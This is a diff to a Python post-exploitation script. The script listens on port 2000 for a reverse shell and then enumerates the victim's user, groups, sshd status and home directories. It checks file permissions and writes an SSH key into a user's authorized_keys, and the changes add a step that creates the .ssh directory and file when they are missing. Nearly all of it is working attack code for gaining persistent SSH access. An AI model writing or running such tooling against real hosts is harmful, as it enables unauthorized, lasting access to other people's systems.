@@ -22,9 +22,6 @@ class Perm():
         sx = "".join(list(map(str,map(sum,[(map(int,list(s[i:i+3]))) for i in range(0,len(s),3)]))))
         # * Janky one liner to get int permissions
         self.NumPerm = sx
-        
-        
-
 
 class Item():
     def __init__(self,Perms,Owner,Group,FileSize,Name):
@@ -43,6 +40,7 @@ class User():
         self.Name = Name
         self.CurrentUser = CurrentUser
         self.Groups = Groups
+        self.CanWriteToHomeDir = None
         self.p = p 
         self.SSH_Dir_Items = {}
         self.Home_Dir_Items = {}
@@ -64,8 +62,7 @@ class User():
 
         
     def CheckHomeDirWriteable(self):
-        L.sendline(f"ls -la /home/{self.Name}/".encode())
-        R()
+        SendLine(f"ls -la /home/{self.Name}/".encode())
         AccessRights = Sanitise(DefaultReply,L.recv(1024))
      
         for _ in AccessRights.split("\n")[1:]:
@@ -85,11 +82,12 @@ class User():
         if CanWrite:
             self.p.status("'authorized_keys' can be created")
             
+        self.CanWriteToHomeDir = CanWrite
+            
      
 
     def CheckAccessRights(self):
-        L.sendline(b"ls -la /home/NxtDaemon/.ssh")
-        R()
+        SendLine(b"ls -la /home/NxtDaemon/.ssh")
 
         AccessRights = Sanitise(DefaultReply,L.recv(1024))
         
@@ -108,8 +106,11 @@ class User():
         AuthKeys = self.SSH_Dir_Items.get("authorized_keys",False)
         
         if not AuthKeys:
-            self.p.status("No 'authorized_keys' file exists")
+            self.p.status("'authorized_keys' file doesn't exists")
             self.CheckHomeDirWriteable()
+            if self.CanWriteToHomeDir:
+                self.CreateSSHConfig()
+
         else:
             self.p.status("'authorized_keys' file exists")
             if self.CanWrite(vars(AuthKeys)):
@@ -118,20 +119,20 @@ class User():
     def WriteKey(self):
         Key = """HOST"""
         
-        L.sendline(f"echo '{Key}' >> /home/{self.Name}/.ssh/authorized_keys".encode())
-        R() # * Reply of Command 
+        SendLine(f"echo '{Key}' >> /home/{self.Name}/.ssh/authorized_keys".encode()) 
         L.clean(0.1)
         self.p.success(f"Added key to Hosts File")
     
     def CanWrite(self,File,NameOverwrite=""):
+        WritePermInts = [7,6,3]
         Name = File.get("Name") if NameOverwrite == "" else NameOverwrite
         Perms = str(File.get("Perms"))
         Owner = File.get("Owner")
         Group = File.get("Group")
                         
-        OwnerWritable = True if int(Perms[0]) > 4 and (Owner == self.CurrentUser) else False
-        GroupWritable = True if int(Perms[1]) > 4 and Group in self.Groups else False
-        WorldWriteable = True if int(Perms[2]) > 4 else False
+        OwnerWritable = True if int(Perms[0]) in WritePermInts and (Owner == self.CurrentUser) else False
+        GroupWritable = True if int(Perms[1]) in WritePermInts and Group in self.Groups else False
+        WorldWriteable = True if int(Perms[2]) in WritePermInts else False
         
         if WorldWriteable:
             self.p.status(f"'{Name}' Is World Writeable")
@@ -146,34 +147,50 @@ class User():
             self.p.failure(f"'{Name}' Is Not Writeable.")
             return(False)
         
-        
+    def CreateSSHConfig(self):
+        SendLine(f"mkdir /home/{self.Name}/.ssh/".encode())
+        SendLine(f"touch /home/{self.Name}/.ssh/authorized_keys".encode())
+        self.p.status("Created '.ssh/' and 'authorized_keys'")
+        self.WriteKey()
+      
 class SSH_Infomation():
     def __init__(self):
         SSH_Enabled = None
         SSH_Running = None
         self.Users = []
         self.Groups = []
+        self.AllowList = []
         self.CurrentUser = "UNKNOWN"
         self.GetUser()
         self.GetGroups()
+        self.AllowedUsers()
         self.CheckSSH()
 
     def GetUser(self):
-        L.sendline(b"whoami")
-        R() # * Reply of Command 
+        SendLine(b"whoami") 
         Name = Sanitise(DefaultReply,L.recv(4096))
         self.CurrentUser = Name
+        log.info(f"Current Logged On As : {Name}")
 
     def GetGroups(self):
-        L.sendline(b"groups")
-        R() # * Reply of Command
+        SendLine(b"groups")
         Groups = Sanitise(DefaultReply,L.recv(4096)).split(" ")
         self.Groups = Groups
-    
+        log.info(f"Current User Has Groups : {Groups}")
+        
+    def AllowedUsers(self):
+        SendLine(b"grep 'AllowUsers' /etc/ssh/sshd_config ")
+        Users = Sanitise(DefaultReply, L.recv().replace(b"AllowUsers",b""))
+        if Users == "":
+            self.AllowList = False
+            log.info("SSHD Config Appears to NOT be using an AllowList.")
+        else:
+            self.AllowList = Users.split(" ")
+            log.info(f"SSHD Config Appears to be using an AllowList, Users in AllowList -> {self.AllowList}")
+            
     def CheckSSH(self):
-        L.sendline(b"ps aux | grep sshd")
-        R() # * Reply of Command 
-        Processes = Sanitise(DefaultReply,L.clean(0.1)).split("\n")
+        SendLine(b"ps aux | grep sshd")
+        Processes = Sanitise(DefaultReply,L.clean(0.15)).split("\n")
         log.info("")
         log.info("Displaying sshd Processes")
         for _ in Processes:
@@ -181,11 +198,14 @@ class SSH_Infomation():
             
         if len(Processes) >= 2:
             self.SSH_Running = True
+            log.info("")
+            log.info("Likelyhood of SSHD running seems high")
             self.GetUsers()
         else:
             X = None
             while X == None:
                 try:
+                    log.info("Likelyhood of SSHD running seems low")
                     Response = input("Do you want to attempt AutoSSh Anyway? [Y/N] > ").upper()
                     if not Response in ["Y","N"]:
                         raise("Not Correct Response")
@@ -198,8 +218,7 @@ class SSH_Infomation():
                     pass
             
     def GetUsers(self):
-        L.sendline(b"ls /home")
-        R() # * Reply Of Command 
+        SendLine(b"ls /home")
         Contents = Sanitise(DefaultReply,L.recv(4096))
         Users = Contents.split("\n")
         
@@ -212,8 +231,9 @@ class SSH_Infomation():
             
         return Users
 
-def R():
-     return(L.recv(1024))
+def SendLine(Content):
+    L.sendline(Content)
+    L.recv(1024)
  
 def Sanitise(DefaultReply,String : str):
     if isinstance(String, bytes):
@@ -222,13 +242,11 @@ def Sanitise(DefaultReply,String : str):
     String = String.strip().replace(DefaultReply,"")
     return String.strip()
 
-        
-    
 
 # * Setup Listener Shell
 L = listen(2000)
 print(f"Listening On 0.0.0.0:{L.lport}")
-DefaultReply = R().decode().strip()
+DefaultReply = L.recv(1024).decode().strip()
 X = SSH_Infomation()
 
 try:
